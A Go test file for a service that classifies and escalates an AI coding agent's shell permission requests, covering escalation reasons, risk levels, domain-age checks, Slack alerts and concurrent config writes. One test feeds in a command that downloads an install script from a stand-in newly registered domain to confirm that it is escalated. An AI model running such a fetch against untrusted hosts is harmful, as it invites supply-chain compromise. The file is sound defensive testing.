package services

import (
	"context"
	"encoding/json"
	"fmt"
	"io"
	"net/http"
	"net/http/httptest"
	"os"
	"path/filepath"
	"strings"
	"sync"
	"sync/atomic"
	"testing"
	"time"
	"unicode/utf8"

	"github.com/stretchr/testify/require"
	"github.com/tstapler/stapler-squad/pkg/classifier"
	"github.com/tstapler/stapler-squad/server/events"
	"github.com/tstapler/stapler-squad/session"
	"github.com/tstapler/stapler-squad/testutil"
)

// TestApprovalHandler_should_UseBaseURLFnValueAtCallTime_When_ThreeUsageSitesInvoked
// (REQ-3 test #4, plan.md Task 1.3.1b).
//
// Stubs the shared hookBaseURLFn (hook_injector.go) to return a distinct value on every
// invocation and drives InjectHookConfig twice against the same settings file so all three
// known usage sites (approval_handler.go: building the curl command, the "already present"
// short-circuit check, and the legacy-URL migration filter) each execute and each
// must reflect whatever baseURLFn() returns at *their* point of use -- never a
// value snapshotted once at ApprovalHandler construction time.
func TestApprovalHandler_should_UseBaseURLFnValueAtCallTime_When_ThreeUsageSitesInvoked(t *testing.T) {
	// Deliberately NOT t.Parallel(): this test overwrites the package-level hookBaseURLFn
	// (hook_injector.go) with a stub whose return value changes on every invocation, and
	// hookBaseURLFn's own accessors are only mutex-guarded against torn reads/writes of the
	// closure value itself -- they don't protect against a *different* test's goroutine
	// invoking whatever closure happens to be installed. Any other parallel test that calls
	// hookApprovalURL()/InjectHooksConfig while this test's stub is installed would (a) get a
	// non-default URL it doesn't expect, and (b) drive unsynchronized increments of this
	// test's own `calls` counter from a foreign goroutine -- a genuine data race on `calls`
	// caught by `-race`, which is exactly the flake this comment documents. Running this test
	// non-parallel guarantees Go's test runner finishes it (including the t.Cleanup restore
	// below) before any t.Parallel() tests in this package start, so the shared global is
	// never observed mid-mutation. See the `fix-flaky-tests-dont-defer` skill.
	//
	// Save/restore hookBaseURLFn so this test's deliberately-unstable stub base URL doesn't
	// leak into other tests in this package that call hookApprovalURL()/InjectHookConfig and
	// expect the stable default.
	original := getHookBaseURLFn()
	t.Cleanup(func() { SetHookBaseURLFn(original) })

	calls := 0
	nextAddr := func() string {
		calls++
		return fmt.Sprintf("http://localhost:%d", 20000+calls)
	}

	// baseURLFn resolves to whatever nextAddr() currently returns.
	// This exercises usage site #1 (building the curl command) with the first address.
	SetHookBaseURLFn(nextAddr)
	_ = NewApprovalHandler(NewApprovalStore(""), nil, events.NewEventBus(1))

	tmpDir := t.TempDir()
	if err := InjectHookConfig(tmpDir, "session-a"); err != nil {
		t.Fatalf("InjectHookConfig (first write): %v", err)
	}
	firstAddr := fmt.Sprintf("http://localhost:%d", 20000+calls) // whatever nextAddr() returned during that call

	settings := readSettings(t, tmpDir)
	firstGroups := permissionRequestGroups(t, settings)
	if !commandsContain(firstGroups, firstAddr) {
		t.Fatalf("expected first InjectHookConfig call to bake in the base URL current at that call (%q), got groups: %+v", firstAddr, firstGroups)
	}

	// baseURLFn is the same nextAddr closure, but the counter keeps advancing, so the base
	// URL moves forward, mirroring a server that rebinds to a different port between
	// hook-injection events -- the exact scenario the lazy baseURLFn mechanism exists to
	// support (never a string baked in at construction time).
	if err := InjectHookConfig(tmpDir, "session-a"); err != nil {
		t.Fatalf("InjectHookConfig (second write): %v", err)
	}

	settings = readSettings(t, tmpDir)
	secondGroups := permissionRequestGroups(t, settings)

	// Usage site #2 (the "already present" short-circuit) must have compared against
	// the CURRENT base URL, not the first call's -- otherwise it would have incorrectly
	// matched the stale entry and skipped writing a fresh one entirely.
	//
	// Usage site #3 (the legacy-URL migration filter) must also have evaluated against
	// the CURRENT base URL when deciding what to strip -- our command-type entries have
	// no URL field, so both survive, proving the filter ran (using the current value)
	// without wrongly discarding the earlier entry.
	if len(secondGroups) < 2 {
		t.Fatalf("expected the second InjectHookConfig call to prepend a fresh entry alongside the first (proving the 'already present' check used the CURRENT base URL, not a stale snapshot), got %d group(s): %+v", len(secondGroups), secondGroups)
	}
	if !commandsContain(secondGroups, firstAddr) {
		t.Fatalf("expected the original entry (built with %q) to survive the legacy-URL migration filter, got groups: %+v", firstAddr, secondGroups)
	}
	if strings.Contains(fmt.Sprint(secondGroups), firstAddr) && !commandsContainNewerThan(secondGroups, firstAddr) {
		t.Fatalf("expected a newly prepended entry reflecting the base URL current at the SECOND call's point of use, got groups: %+v", secondGroups)
	}
}

// permissionRequestGroups extracts the PermissionRequest hookMatcherGroup slice from a
// parsed settings.local.json top-level map, failing the test on any parse error.
func permissionRequestGroups(t *testing.T, top map[string]json.RawMessage) []hookMatcherGroup {
	t.Helper()
	hooksRaw, ok := top["hooks"]
	if !ok {
		t.Fatal("hooks key not present in settings")
	}
	var hooks map[string]json.RawMessage
	if err := json.Unmarshal(hooksRaw, &hooks); err != nil {
		t.Fatalf("parse hooks map: %v", err)
	}
	prRaw, ok := hooks["PermissionRequest"]
	if !ok {
		t.Fatal("PermissionRequest key not present in hooks")
	}
	var groups []hookMatcherGroup
	if err := json.Unmarshal(prRaw, &groups); err != nil {
		t.Fatalf("parse PermissionRequest groups: %v", err)
	}
	return groups
}

// commandsContain reports whether any command-type hook entry across groups contains substr.
func commandsContain(groups []hookMatcherGroup, substr string) bool {
	for _, g := range groups {
		for _, h := range g.Hooks {
			if h.Type == "command" && strings.Contains(h.Command, substr) {
				return true
			}
		}
	}
	return false
}

// commandsContainNewerThan reports whether any command-type hook entry contains an
// "http://localhost:<port>" address other than staleAddr, i.e. a freshly-written entry
// distinct from the one built with staleAddr.
func commandsContainNewerThan(groups []hookMatcherGroup, staleAddr string) bool {
	for _, g := range groups {
		for _, h := range g.Hooks {
			if h.Type != "command" {
				continue
			}
			if strings.Contains(h.Command, "http://localhost:") && !strings.Contains(h.Command, staleAddr) {
				return true
			}
		}
	}
	return false
}

// ─── Escalation reason regression tests (escalation-reasoning Epic 5.1, Story 5.1.1) ──

// waitForFirstApprovalThenResolve polls the store until an approval appears, captures a
// copy of its escalation fields (immutable post-construction per approval_store.go's
// contract), then resolves it so the blocked HandlePermissionRequest call returns. Runs
// in the caller's goroutine -- callers should invoke it via `go` before firing the
// blocking POST.
func waitForFirstApprovalThenResolve(t *testing.T, store *ApprovalStore, captured *PendingApproval) {
	t.Helper()
	var approvalID string
	err := testutil.WaitForCondition(func() bool {
		approvals := store.ListAll()
		if len(approvals) > 0 {
			approvalID = approvals[0].ID
			return true
		}
		return false
	}, testutil.FastWaitConfig())
	if err != nil || approvalID == "" {
		t.Errorf("approval never appeared in store: %v", err)
		return
	}
	a, found := store.Get(approvalID)
	if !found {
		t.Errorf("approval %s disappeared before it could be captured", approvalID)
		return
	}
	*captured = *a
	if err := store.Resolve(approvalID, ApprovalDecision{Behavior: "deny", Message: "test cleanup"}); err != nil {
		t.Errorf("Resolve returned error: %v", err)
	}
}

// TestHandlePermissionRequest_EscalationReason_NoMatch covers AC1's no-match path: a
// command matching zero classifier rules must populate PendingApproval.EscalationReason
// with the static fallback sentence and EscalationCategory "no-match" (plan.md Task
// 5.1.1b, validation.md AC1 "end-to-end capture at source" row).
func TestHandlePermissionRequest_EscalationReason_NoMatch(t *testing.T) {
	t.Parallel()
	h, store := newTestHandler(5 * time.Second)
	h.SetClassifier(classifier.NewRuleBasedClassifier())

	var captured PendingApproval
	go waitForFirstApprovalThenResolve(t, store, &captured)

	postPermissionRequestWithCommand(t, h, "test-session", "Bash", "totally-unmatched-cmd-xyz123 --flag")

	if captured.EscalationReason != "No matching rule; escalated for manual review." {
		t.Errorf("EscalationReason = %q, want the static no-match fallback sentence", captured.EscalationReason)
	}
	if captured.EscalationCategory != "no-match" {
		t.Errorf("EscalationCategory = %q, want %q", captured.EscalationCategory, "no-match")
	}
}

// TestHandlePermissionRequest_EscalationReason_ExplicitRule covers AC1's explicit-rule
// path: "git branch -d feature/foo" matches the seed rule
// seed-escalate-git-branch-safe-delete, so EscalationReason must be that rule's own
// Reason text verbatim and EscalationCategory "explicit-rule" (plan.md Story 2.1.2's
// example, validation.md AC1 row).
func TestHandlePermissionRequest_EscalationReason_ExplicitRule(t *testing.T) {
	t.Parallel()
	h, store := newTestHandler(5 * time.Second)
	h.SetClassifier(classifier.NewRuleBasedClassifier())

	var captured PendingApproval
	go waitForFirstApprovalThenResolve(t, store, &captured)

	postPermissionRequestWithCommand(t, h, "test-session", "Bash", "git branch -d feature/foo")

	wantReason := "Branch deletion modifies repository structure and should be reviewed."
	if captured.EscalationReason != wantReason {
		t.Errorf("EscalationReason = %q, want %q", captured.EscalationReason, wantReason)
	}
	if captured.EscalationCategory != "explicit-rule" {
		t.Errorf("EscalationCategory = %q, want %q", captured.EscalationCategory, "explicit-rule")
	}
}

// fakeRDAPTransport is an http.RoundTripper stub that returns a canned RDAP response
// reporting the given registration date for any request, regardless of host -- avoids
// a real network call to rdap.org from a unit test.
type fakeRDAPTransport struct {
	registeredAt time.Time
}

func (f *fakeRDAPTransport) RoundTrip(_ *http.Request) (*http.Response, error) {
	body := fmt.Sprintf(`{"events":[{"eventAction":"registration","eventDate":%q}]}`, f.registeredAt.Format(time.RFC3339))
	return &http.Response{
		StatusCode: http.StatusOK,
		Status:     "200 OK",
		Body:       io.NopCloser(strings.NewReader(body)),
		Header:     make(http.Header),
	}, nil
}

// TestHandlePermissionRequest_EscalationReason_DomainAge covers AC1's domain-age path:
// a Bash command contacting a newly-registered domain must populate EscalationReason
// with the domain-age sentence (approval_handler.go's `Domain %q was registered within
// the last %d days...` format) and EscalationCategory "domain-age" (plan.md Story 2.1.3's
// worked example, validation.md AC1 row). This path short-circuits via `goto
// createApproval` before the classifier ever runs, so no classifier is configured here.
func TestHandlePermissionRequest_EscalationReason_DomainAge(t *testing.T) {
	t.Parallel()
	h, store := newTestHandler(5 * time.Second)

	checker := NewDomainAgeChecker(true)
	checker.httpClient = &http.Client{
		Transport: &fakeRDAPTransport{registeredAt: time.Now().Add(-5 * 24 * time.Hour)},
	}
	h.SetDomainChecker(checker)

	var captured PendingApproval
	go waitForFirstApprovalThenResolve(t, store, &captured)

	postPermissionRequestWithCommand(t, h, "test-session", "Bash", "curl https://sketchy-newdomain.xyz/install.sh")

	wantReason := `Domain "sketchy-newdomain.xyz" was registered within the last 30 days — possible phishing or supply-chain risk.`
	if captured.EscalationReason != wantReason {
		t.Errorf("EscalationReason = %q, want %q", captured.EscalationReason, wantReason)
	}
	if captured.EscalationCategory != "domain-age" {
		t.Errorf("EscalationCategory = %q, want %q", captured.EscalationCategory, "domain-age")
	}
	if captured.RiskLevel != "high" {
		t.Errorf("RiskLevel = %q, want %q (domain-age escalations are hardcoded RiskHigh)", captured.RiskLevel, "high")
	}
}

// fakeCriticalEscalateClassifier always escalates with RiskCritical, independent of any real
// seed rule table (no seed rule reaches Escalate+RiskCritical today — RiskCritical is reserved
// for AutoDeny rules like force-push/env-write). Used to prove riskLevelString(RiskCritical)
// threads through end-to-end without depending on the seed rule set staying exactly as-is.
type fakeCriticalEscalateClassifier struct{}

func (fakeCriticalEscalateClassifier) Classify(_ classifier.PermissionRequestPayload, _ classifier.ClassificationContext) classifier.ClassificationResult {
	return classifier.ClassificationResult{Decision: classifier.Escalate, RiskLevel: classifier.RiskCritical, Reason: "fake critical escalation"}
}

func (fakeCriticalEscalateClassifier) BuildContext(_ string) classifier.ClassificationContext {
	return classifier.ClassificationContext{}
}

// TestCreateApproval_should_SetRiskLevelFromClassifier_When_EscalationMatchesRiskCriticalRule
// covers plan.md Task 1.1.1/1.1.2: a classified Escalate result's RiskLevel must be threaded
// onto PendingApproval.RiskLevel via riskLevelString, not dropped.
func TestCreateApproval_should_SetRiskLevelFromClassifier_When_EscalationMatchesRiskCriticalRule(t *testing.T) {
	t.Parallel()
	h, store := newTestHandler(5 * time.Second)
	h.SetClassifier(fakeCriticalEscalateClassifier{})

	var captured PendingApproval
	go waitForFirstApprovalThenResolve(t, store, &captured)

	postPermissionRequestWithCommand(t, h, "test-session", "Bash", "anything")

	if captured.RiskLevel != "critical" {
		t.Errorf("RiskLevel = %q, want %q", captured.RiskLevel, "critical")
	}
}

// TestCreateApproval_should_SetRiskLevelFromClassifier_When_EscalationMatchesSeedRule covers
// the real seed-rule path (not a fake classifier): "git push" (no --force) matches
// seed-escalate-git-push, an Escalate+RiskHigh rule, so RiskLevel must be "high", mirroring
// the existing EscalationReason_ExplicitRule test's structure.
func TestCreateApproval_should_SetRiskLevelFromClassifier_When_EscalationMatchesSeedRule(t *testing.T) {
	t.Parallel()
	h, store := newTestHandler(5 * time.Second)
	h.SetClassifier(classifier.NewRuleBasedClassifier())

	var captured PendingApproval
	go waitForFirstApprovalThenResolve(t, store, &captured)

	postPermissionRequestWithCommand(t, h, "test-session", "Bash", "git push origin main")

	if captured.RiskLevel != "high" {
		t.Errorf("RiskLevel = %q, want %q", captured.RiskLevel, "high")
	}
}

// TestCreateApproval_should_SetEmptyRiskLevel_When_ClassifierIsNilAtCreation covers
// pre-mortem.md Failure #1: when h.classifier is nil (no SetClassifier call) and no domain
// checker fires, `escalation` is never assigned — riskLevelString(escalation.RiskLevel) would
// naively return "low" (RiskLow is the Go zero value), silently mislabeling an unclassified
// request as genuinely safe. RiskLevel must be "" (not recorded), never "low".
func TestCreateApproval_should_SetEmptyRiskLevel_When_ClassifierIsNilAtCreation(t *testing.T) {
	t.Parallel()
	h, store := newTestHandler(5 * time.Second)
	// Deliberately no h.SetClassifier(...) call -- h.classifier stays nil.

	var captured PendingApproval
	go waitForFirstApprovalThenResolve(t, store, &captured)

	postPermissionRequestWithCommand(t, h, "test-session", "Bash", "anything")

	if captured.RiskLevel != "" {
		t.Errorf("RiskLevel = %q, want %q (unclassified requests must never appear as a real risk level)", captured.RiskLevel, "")
	}
}

// TestTruncateEscalationReason covers the boundary cases the escalation-reasoning
// architecture review flagged: truncateEscalationReason must never cut mid-rune, since
// EscalationReasonText routinely produces strings containing multi-byte UTF-8 (e.g. the
// em dash "—" in the no-match/domain-age sentences) and the result is persisted to disk.
func TestTruncateEscalationReason(t *testing.T) {
	t.Parallel()
	tests := []struct {
		name string
		in   string
		want string
	}{
		{
			name: "under limit passes through unchanged",
			in:   "short reason",
			want: "short reason",
		},
		{
			name: "exact limit passes through unchanged",
			in:   strings.Repeat("a", maxEscalationReasonLen),
			want: strings.Repeat("a", maxEscalationReasonLen),
		},
		{
			name: "over limit truncates at an ASCII boundary",
			in:   strings.Repeat("a", maxEscalationReasonLen+10),
			want: strings.Repeat("a", maxEscalationReasonLen) + "...",
		},
		{
			name: "over limit with a multi-byte rune straddling the cut point stays valid UTF-8",
			// Each "aaaaaaaaa—" chunk is exactly 10 runes (9 ASCII + 1 em dash), so the
			// maxEscalationReasonLen-rune cut lands exactly between chunks — the case
			// byte-slicing would corrupt, since len(em dash) in bytes != 1.
			in:   strings.Repeat("aaaaaaaaa—", maxEscalationReasonLen/10+2),
			want: strings.Repeat("aaaaaaaaa—", maxEscalationReasonLen/10) + "...",
		},
	}
	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			t.Parallel()
			got := truncateEscalationReason(tt.in)
			if !utf8.ValidString(got) {
				t.Fatalf("truncateEscalationReason(%d runes) produced invalid UTF-8: %q", len([]rune(tt.in)), got)
			}
			if got != tt.want {
				t.Errorf("truncateEscalationReason() = %q, want %q", got, tt.want)
			}
		})
	}
}

// fakeUnrecognizedDecisionClassifier returns a ClassificationDecision outside the known
// AutoAllow/AutoDeny/Escalate enum, simulating a future 4th decision value or an internal
// classifier bug — the exact scenario approval_handler.go's default: branch exists to guard
// against (Pre-mortem P3).
type fakeUnrecognizedDecisionClassifier struct{}

func (fakeUnrecognizedDecisionClassifier) Classify(_ classifier.PermissionRequestPayload, _ classifier.ClassificationContext) classifier.ClassificationResult {
	return classifier.ClassificationResult{Decision: classifier.ClassificationDecision(99)}
}

func (fakeUnrecognizedDecisionClassifier) BuildContext(_ string) classifier.ClassificationContext {
	return classifier.ClassificationContext{}
}

// TestHandlePermissionRequest_EscalationReason_UnexpectedDecision covers the default: branch
// in HandlePermissionRequest's decision switch: an unrecognized ClassificationDecision must
// fail safe to manual review, categorized "unexpected" (not "no-match", even though
// result.RuleID is "" — no rule lookup occurred), and — critically — the analytics record for
// the same event must agree with that category. Regression test for a bug caught during code
// review: analytics recorded the raw pre-normalization result.RuleID, so this exact edge case
// bucketed as "no-match" in the Escalation Reasons table while the review-queue card correctly
// showed "unexpected" for the same request.
func TestHandlePermissionRequest_EscalationReason_UnexpectedDecision(t *testing.T) {
	t.Parallel()
	storage := createTestStorage(t)
	analyticsStore := NewAnalyticsStore(storage)
	analyticsStore.Start(context.Background())
	t.Cleanup(analyticsStore.Stop)

	store := NewApprovalStore("")
	bus := events.NewEventBus(10)
	h := NewApprovalHandler(store, nil, bus)
	h.timeout = 5 * time.Second
	h.SetAnalyticsStore(analyticsStore)
	h.SetClassifier(fakeUnrecognizedDecisionClassifier{})

	var captured PendingApproval
	go waitForFirstApprovalThenResolve(t, store, &captured)

	postPermissionRequestWithCommand(t, h, "test-session", "Bash", "anything")

	if captured.EscalationCategory != "unexpected" {
		t.Errorf("EscalationCategory = %q, want %q", captured.EscalationCategory, "unexpected")
	}
	if captured.EscalationReason != "An internal classification error occurred — review manually." {
		t.Errorf("EscalationReason = %q, want the internal-error sentence", captured.EscalationReason)
	}

	var entries []AnalyticsEntry
	require.Eventually(t, func() bool {
		var err error
		entries, err = analyticsStore.LoadWindow(context.Background(), time.Now().Add(-1*time.Hour))
		return err == nil && len(entries) >= 1
	}, 2*time.Second, 10*time.Millisecond, "analytics entry must persist within 2s")

	summary := ComputeSummary(entries)
	if got := summary.EscalationReasonCounts["unexpected"]; got != 1 {
		t.Errorf("EscalationReasonCounts[\"unexpected\"] = %d, want 1 (got full map: %v)", got, summary.EscalationReasonCounts)
	}
	if got := summary.EscalationReasonCounts["no-match"]; got != 0 {
		t.Errorf("EscalationReasonCounts[\"no-match\"] = %d, want 0 — analytics must not disagree with the review-queue card's \"unexpected\" category", got)
	}
}

// TestHandlePermissionRequest_SessionIdleMinutes_PopulatedFromLiveInstance verifies that
// when a live instance is found, ClassificationContext.SessionIdleMinutes is populated from
// Instance.GetTimeSinceLastMeaningfulOutput(), converted to whole minutes. Population happens
// unconditionally inside the liveFinder nil-guard (not nested under the GitHubPRNumber > 0
// check next to it) because idle time is independent of whether the session has an open PR.
func TestHandlePermissionRequest_SessionIdleMinutes_PopulatedFromLiveInstance(t *testing.T) {
	t.Parallel()
	h, storage := newHandlerWithStorage(t)
	cc := &capturingClassifier{}
	h.SetClassifier(cc)
	h.timeout = 100 * time.Millisecond // short so the Escalate fallthrough times out fast

	const uuid = "eeeeeeee-1111-2222-3333-ffffffffffff"
	now := time.Now()
	inst := &session.Instance{
		Title:     "idle-session",
		UUID:      uuid,
		Path:      "/projects/idle",
		Status:    session.Paused,
		Program:   "claude",
		CreatedAt: now.Add(-75 * time.Minute), // no meaningful output recorded — falls back to time since creation
		UpdatedAt: now,
	}
	require.NoError(t, storage.AddInstance(inst))
	h.SetLiveInstanceFinder(&fakeApprovalLiveInstanceFinder{inst: inst})

	postPermissionRequestWithCommand(t, h, uuid, "Bash", "npm test")

	require.Equal(t, 75, cc.lastCtx.SessionIdleMinutes,
		"a live instance idle for 75 minutes must populate SessionIdleMinutes=75")
}

// TestHandlePermissionRequest_SessionIdleMinutes_ZeroValue_When_NoLiveInstance verifies the
// fail-closed contract documented on ClassificationContext.SessionIdleMinutes: when no live
// instance is found for the session, the field is left at its Go zero value (0) rather than
// set to a sentinel "unknown"/"infinite" value, so it can never accidentally satisfy a
// MinSessionIdleMinutes > 0 rule condition.
func TestHandlePermissionRequest_SessionIdleMinutes_ZeroValue_When_NoLiveInstance(t *testing.T) {
	t.Parallel()
	h, _ := newHandlerWithStorage(t)
	cc := &capturingClassifier{}
	h.SetClassifier(cc)
	h.timeout = 100 * time.Millisecond
	h.SetLiveInstanceFinder(&fakeApprovalLiveInstanceFinder{inst: nil}) // FindLiveInstance always returns nil

	postPermissionRequestWithCommand(t, h, "unknown-session-id", "Bash", "npm test")

	require.Equal(t, 0, cc.lastCtx.SessionIdleMinutes,
		"no live instance found must leave SessionIdleMinutes at the Go zero value, never a sentinel")
}

// --------------------------------------------------------------------------
// Slack notification wiring (Epic 1.3, Story 1.3.2)
// --------------------------------------------------------------------------

// TestBroadcastApprovalNotification_InvokesNotifyApprovalPending_When_SlackNotifierWired
// is the happy-path REQ-10 test (plan.md Story 1.3.2 AC1): a wired
// *SlackNotifier, pointed (via SLACK_WEBHOOK_URL) at an httptest.Server, sees
// exactly one webhook POST when broadcastApprovalNotification runs — proving
// NotifyApprovalPending was invoked (it dispatches its own POST internally,
// per Story 1.2.3's ownership model).
func TestBroadcastApprovalNotification_InvokesNotifyApprovalPending_When_SlackNotifierWired(t *testing.T) {
	t.Setenv("STAPLER_SQUAD_TEST_DIR", t.TempDir())

	var requestCount atomic.Int32
	srv := httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		requestCount.Add(1)
		w.WriteHeader(http.StatusOK)
	}))
	defer srv.Close()
	t.Setenv("SLACK_WEBHOOK_URL", srv.URL)

	bus := events.NewEventBus(4)
	defer bus.Close()
	h := NewApprovalHandler(NewApprovalStore(""), nil, bus)
	h.SetSlackNotifier(NewSlackNotifier())

	approval := &PendingApproval{
		ID:        "appr-1",
		SessionID: "sess-1",
		ToolName:  "Bash",
		ToolInput: map[string]interface{}{},
	}
	h.broadcastApprovalNotification("sess-1", approval)

	require.Eventually(t, func() bool {
		return requestCount.Load() >= 1
	}, 3*time.Second, 10*time.Millisecond, "expected NotifyApprovalPending to POST to the configured webhook")

	// Give any accidental second dispatch a moment to land, then assert the
	// count settled at exactly one call.
	time.Sleep(100 * time.Millisecond)
	require.EqualValues(t, 1, requestCount.Load(), "NotifyApprovalPending should be invoked exactly once")
}

// TestBroadcastApprovalNotification_NoPanic_When_SlackNotifierNil is the
// error/edge-path REQ-10 test (plan.md Story 1.3.2 AC2): an ApprovalHandler
// that never calls SetSlackNotifier (h.slackNotifier == nil, e.g. every other
// existing unit test in this file) must behave identically to the pre-feature
// baseline — no panic, and the existing eventBus.Publish notification still
// fires normally.
func TestBroadcastApprovalNotification_NoPanic_When_SlackNotifierNil(t *testing.T) {
	t.Parallel()
	bus := events.NewEventBus(4)
	defer bus.Close()
	h := NewApprovalHandler(NewApprovalStore(""), nil, bus)
	// Deliberately never call h.SetSlackNotifier — h.slackNotifier stays nil.

	ctx, cancel := context.WithTimeout(context.Background(), 3*time.Second)
	defer cancel()
	eventCh, _ := bus.Subscribe(ctx)

	approval := &PendingApproval{
		ID:        "appr-2",
		SessionID: "sess-2",
		ToolName:  "Bash",
		ToolInput: map[string]interface{}{},
	}

	require.NotPanics(t, func() {
		h.broadcastApprovalNotification("sess-2", approval)
	})

	select {
	case ev := <-eventCh:
		require.Equal(t, events.EventNotification, ev.Type, "baseline eventBus notification must still fire when slackNotifier is nil")
	case <-time.After(2 * time.Second):
		t.Fatal("timed out waiting for baseline eventBus notification")
	}
}

// TestInjectHookConfig_ConcurrentWritesToSameRootDir_NeverProduceCorruptJSON is a
// regression test for the fixed-tmp-filename write race InjectHookConfig used to have
// (writing settingsPath+".tmp" directly via os.WriteFile instead of the hardened
// writeSettingsAtomic) — concurrent InjectHookConfig calls against the same rootDir
// must never interleave writes and rename a torn/corrupt settings.local.json into
// place. Mirrors config_test.go's TestSaveConfig_ConcurrentWritesToSamePath.
func TestInjectHookConfig_ConcurrentWritesToSameRootDir_NeverProduceCorruptJSON(t *testing.T) {
	rootDir := t.TempDir()

	const n = 20
	var wg sync.WaitGroup
	errCh := make(chan error, n)
	for i := 0; i < n; i++ {
		wg.Add(1)
		go func(i int) {
			defer wg.Done()
			errCh <- InjectHookConfig(rootDir, fmt.Sprintf("session-%d", i))
		}(i)
	}
	wg.Wait()
	close(errCh)

	for err := range errCh {
		require.NoError(t, err, "InjectHookConfig must not error under concurrent callers targeting the same rootDir")
	}

	data, err := os.ReadFile(filepath.Join(rootDir, ".claude", "settings.local.json"))
	require.NoError(t, err, "settings.local.json must exist after concurrent InjectHookConfig calls")

	var parsed map[string]json.RawMessage
	require.NoError(t, json.Unmarshal(data, &parsed), "settings.local.json must be valid JSON after concurrent writes, not torn/corrupt: %s", data)
}
